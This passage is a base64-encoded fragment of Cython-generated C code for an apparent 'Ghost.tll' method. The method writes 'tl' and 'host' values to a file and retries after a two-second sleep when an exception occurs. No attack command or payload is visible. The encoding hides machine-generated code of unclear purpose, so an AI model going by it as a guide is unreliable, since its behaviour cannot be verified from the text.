PSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wxMl9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEzKTsKICAgICAgICB9CiAgICAgICAgX19weXhfdF82ID0gX19weXhfdF8xMzsKICAgICAgICBfX3B5eF90XzEzID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgewogICAgICAgICAgewogICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xNSwgJl9fcHl4X3RfMTYsICZfX3B5eF90XzE3KTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE3KTsKICAgICAgICAgICAgIHsKICAgICAgICAgICAgICBfX3B5eF92X2YgPSBfX3B5eF90XzY7CiAgICAgICAgICAgICAgX19weXhfdF82ID0gMDsKCiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgX19weXhfdF83ID0gX19weXhfdl9mOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpOwogICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl90bCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxMjAsIF9fcHl4X0wxNl9lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMyk7CiAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfaG9zdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEyMCwgX19weXhfTDE2X2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgICAgIF9fcHl4X3RfMThbMF0gPSBfX3B5eF90XzEzOwogICAgICAgICAgICAgIF9fcHl4X3RfMThbMV0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X181OwogICAgICAgICAgICAgIF9fcHl4X3RfMThbMl0gPSBfX3B5eF90XzQ7CiAgICAgICAgICAgICAgX19weXhfdF8xOFszXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzY7CiAgICAgICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMTgsIDQsIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTMpICsgMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNCkgKyAxLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMykgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF80KSk7CiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDEyMCwgX19weXhfTDE2X2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgX19weXhfdF8xMX07CiAgICAgICAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfd3JpdGUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEyMCwgX19weXhfTDE2X2Vycm9yKQogICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwoKICAgICAgICAgICAgICAKICAgICAgICAgICAgfQogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE2KTsgX19weXhfdF8xNiA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwOwogICAgICAgICAgICBnb3RvIF9fcHl4X0wyMV90cnlfZW5kOwogICAgICAgICAgICBfX3B5eF9MMTZfZXJyb3I6OwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgICAgICAgewogICAgICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QudGxsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF82LCAmX19weXhfdF8xMSwgJl9fcHl4X3RfNykgPCAwKSBfX1BZWF9FUlIoMCwgMTE5LCBfX3B5eF9MMThfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF83KTsKICAgICAgICAgICAgICBfX3B5eF90XzQgPSBQeVR1cGxlX1BhY2soMywgX19weXhfdF82LCBfX3B5eF90XzExLCBfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wxOF9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICAgICAgX19weXhfdF8xOSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xNCwgX19weXhfdF80LCBOVUxMKTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xOSkpIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wxOF9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xOSk7CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDsKICAgICAgICAgICAgICBpZiAoX19weXhfdF8xMCA8ICgwKSkgX19QWVhfRVJSKDAsIDExOSwgX19weXhfTDE4X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICBfX3B5eF90XzIwID0gKCFfX3B5eF90XzEwKTsKICAgICAgICAgICAgICBpZiAodW5saWtlbHkoX19weXhfdF8yMCkpIHsKICAgICAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF82KTsKICAgICAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpOwogICAgICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZShfX3B5eF90XzYsIF9fcHl4X3RfMTEsIF9fcHl4X3RfNyk7CiAgICAgICAgICAgICAgICBfX3B5eF90XzYgPSAwOyAgX19weXhfdF8xMSA9IDA7ICBfX3B5eF90XzcgPSAwOyAKICAgICAgICAgICAgICAgIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wxOF9leGNlcHRfZXJyb3IpCiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgICAgICAgZ290byBfX3B5eF9MMTdfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19weXhfTDE4X2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTUsIF9fcHl4X3RfMTYsIF9fcHl4X3RfMTcpOwogICAgICAgICAgICBnb3RvIF9fcHl4X0wzX2Vycm9yOwogICAgICAgICAgICBfX3B5eF9MMTdfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNik7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTcpOwogICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE1LCBfX3B5eF90XzE2LCBfX3B5eF90XzE3KTsKICAgICAgICAgICAgX19weXhfTDIxX3RyeV9lbmQ6OwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAgewogICAgICAgICAgewogICAgICAgICAgICBpZiAoX19weXhfdF8xNCkgewogICAgICAgICAgICAgIF9fcHl4X3RfMTcgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdLCBOVUxMKTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xNykpIF9fUFlYX0VSUigwLCAxMTksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE3KTsKICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNyk7IF9fcHl4X3RfMTcgPSAwOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGdvdG8gX19weXhfTDE1OwogICAgICAgICAgfQogICAgICAgICAgX19weXhfTDE1OjsKICAgICAgICB9CiAgICAgICAgZ290byBfX3B5eF9MMjU7CiAgICAgICAgX19weXhfTDEyX2Vycm9yOjsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDNfZXJyb3I7CiAgICAgICAgX19weXhfTDI1OjsKICAgICAgfQoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7CiAgICBfX3B5eF9MM19lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgIAogICAgX19weXhfdF8yMSA9IF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMoKChQeU9iamVjdCAqKSgoKFB5VHlwZU9iamVjdCopUHlFeGNfRXhjZXB0aW9uKSkpKTsKICAgIGlmIChfX3B5eF90XzIxKSB7CiAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QudGxsIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfNywgJl9fcHl4X3RfMTEsICZfX3B5eF90XzYpIDwgMCkgX19QWVhfRVJSKDAsIDEyMSwgX19weXhfTDVfZXhjZXB0X2Vycm9yKQogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpOwogICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzExOwogICAgICAgewoKICAgICAgICAKICAgICAgICBfX3B5eF90XzEzID0gTlVMTDsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgICAgICAgX19weXhfdF81ID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgICAgICAgX19weXhfdF85ID0gMTsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99OwogICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoX19weXhfdF85Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEyMiwgX19weXhfTDMxX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwoKICAgICAgICAKICAgICAgICBfX3B5eF90XzUgPSBOVUxMOwogICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTMpKSBfX1BZWF9FUlIoMCwgMTIzLCBfX3B5eF9MMzFfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTMpOwogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NsZWVwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTIzLCBfX3B5eF9MMzFfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICAgICAgICBfX3B5eF90XzkgPSAxOwogICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF84KSkpIHsKICAgICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfOCk7CiAgICAgICAgICBhc3NlcnQoX19weXhfdF81KTsKICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF84KTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfOCwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgICAgfQogICAgICAgICNlbmRpZgogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yfTsKICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTIzLCBfX3B5eF9MMzFfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICB9CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CgogICAgICAgIAogICAgICAgIF9fcHl4X3RfOCA9IF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9zZWxmOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpOwogICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgICAgewogICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOCwgTlVMTH07CiAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGxsLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgxLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDEyNCwgX19weXhfTDMxX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgfQogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICB9CgogICAgICAKICAgICAgIHsKICAgICAgICB7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDMyOwogICAgICAgIH0KICAgICAgICBfX3B5eF9MMzFfZXJyb3I6OwogICAgICAgIHsKICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICAgIF9fcHl4X3RfMTQgPSAwOyBfX3B5eF90XzE3ID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTUgPSAwOyBfX3B5eF90XzE5ID0gMDsgX19weXhfdF8yNCA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgICBfX1B5eF9FeGNlcHRpb25Td2FwKCZfX3B5eF90XzE1LCAmX19weXhfdF8xOSwgJl9fcHl4X3RfMjQpOwogICAgICAgICAgaWYgKCB1bmxpa2VseShfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMTQsICZfX3B5eF90XzE3LCAmX19weXhfdF8xNikgPCAwKSkgX19QeXhfRXJyRmV0Y2goJl9fcHl4X3RfMTQsICZfX3B5eF90XzE3LCAmX19weXhfdF8xNik7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTQpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE3KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNik7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE5KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yNCk7CiAgICAgICAgICBfX3B5eF90XzIxID0gX19weXhfbGluZW5vOyBfX3B5eF90XzIyID0gX19weXhfY2xpbmVubzsgX19weXhfdF8yMyA9IF9fcHl4X2ZpbGVuYW1lOwogICAgICAgICAgewogICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdl9lKTsgX19weXhfdl9lID0gMDsKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xOSk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzI0KTsKICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTUsIF9fcHl4X3RfMTksIF9fcHl4X3RfMjQpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE3KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgX19QeXhfRXJyUmVzdG9yZShfX3B5eF90XzE0LCBfX3B5eF90XzE3LCBfX3B5eF90XzE2KTsKICAgICAgICAgIF9fcHl4X3RfMTQgPSAwOyBfX3B5eF90XzE3ID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTUgPSAwOyBfX3B5eF90XzE5ID0gMDsgX19weXhfdF8yNCA9IDA7CiAgICAgICAgICBfX3B5eF9saW5lbm8gPSBfX3B5eF90XzIxOyBfX3B5eF9jbGluZW5vID0gX19weXhfdF8yMjsgX19weXhfZmlsZW5hbWUgPSBfX3B5eF90XzIzOwogICAgICAgICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0wzMjo7CiAgICAgIH0KICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQogICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CgogICAgCiAgICBfX3B5eF9MNV9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBfX3B5eF9MOF90cnlfZW5kOjsKICB9CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTMpOwogIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QudGx